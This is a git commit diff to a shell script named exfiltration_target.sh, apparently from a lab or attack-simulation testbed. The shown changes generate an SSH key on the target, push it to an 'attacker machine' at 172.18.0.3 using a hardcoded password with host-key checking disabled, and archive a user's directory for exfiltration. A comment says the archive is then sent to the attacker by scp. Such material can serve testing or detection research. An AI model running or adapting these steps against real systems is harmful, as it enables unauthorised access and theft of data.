3b800539389f1ab2ae8cd3ab2362997ef92c965c
2002244 <90248075+2002244@users.noreply.github.com>
2022-10-23 14:38:51 +0800

    Update exfiltration_target.sh

--- attackScripts/exfiltration_target.sh
+++ attackScripts/exfiltration_target.sh
@@ -8,20 +8,12 @@
 # Generate SSH key pair and copy it to the attacker machine:
 ssh-keygen -t rsa -f /root/.ssh/id_rsa_Cserver -N ""
 chmod 400 /root/.ssh/id_rsa_Cserver.pub
-sshpass -p "vagrant" ssh-copy-id -i /root/.ssh/id_rsa_Cserver.pub vagrant@172.18.0.3
-
-# Generate some example files and tar them so that the .tar.gz file can be exfiltrated
-# mkdir -p /root/test/stuff
-# cd /root/test/stuff
-# echo "owuoqwdjhoasjdo" > test1.txt
-# echo "sadasdcasdac" > test2.txt
-# echo "owuoqwdjhasdadasdasoasjdo" > test3.txt
-# echo "owuoqasdacdsacdsadscadscadsacdwdjhoasjdo" > test4.txt
+sshpass -p "vagrant" ssh-copy-id -i /root/.ssh/id_rsa_Cserver.pub -o StrictHostKeyChecking=no vagrant@172.18.0.3
 
 cd /home/resch/destination
 touch exfiltrate_backups.tar.gz
+echo "Archiving all files and folders to exfiltrate..."
 tar --exclude=exfiltrate_backups.tar.gz -zcf exfiltrate_backups.tar.gz .
-
 cd /home/resch/.ssh
 
 # Send the tar file to attacker using scp
